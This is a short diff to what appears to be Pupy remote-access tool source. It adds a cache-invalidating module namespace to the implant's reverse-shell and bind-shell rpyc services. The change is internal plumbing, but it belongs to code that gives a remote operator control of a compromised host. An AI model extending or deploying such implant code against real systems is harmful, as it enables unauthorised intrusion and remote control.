@@ -113,6 +113,13 @@ REVERSE_SLAVE_CONF = dict(
     instantiate_oldstyle_exceptions=True,
 )
 
+class UpdatableModuleNamespace(ModuleNamespace):
+    __slots__ = ['__invalidate__']
+
+    def __invalidate__(self, name):
+        cache = self._ModuleNamespace__cache
+        if name in cache:
+            del cache[name]
 
 class ReverseSlaveService(Service):
     """ Pupy reverse shell rpyc service """
@@ -121,7 +128,8 @@ class ReverseSlaveService(Service):
     def on_connect(self):
         self.exposed_namespace = {}
         self._conn._config.update(REVERSE_SLAVE_CONF)
-        self._conn.root.set_modules(ModuleNamespace(self.exposed_getmodule))
+        self._conn.root.set_modules(
+            UpdatableModuleNamespace(self.exposed_getmodule))
 
     def on_disconnect(self):
         print "disconnecting !"
@@ -179,7 +187,8 @@ class BindSlaveService(ReverseSlaveService):
             self._conn.close()
             raise KeyboardInterrupt("wrong password")
 
-        self._conn.root.set_modules(ModuleNamespace(self.exposed_getmodule))
+        self._conn.root.set_modules(
+            UpdatableModuleNamespace(self.exposed_getmodule))
 
 
 def get_next_wait(attempt):
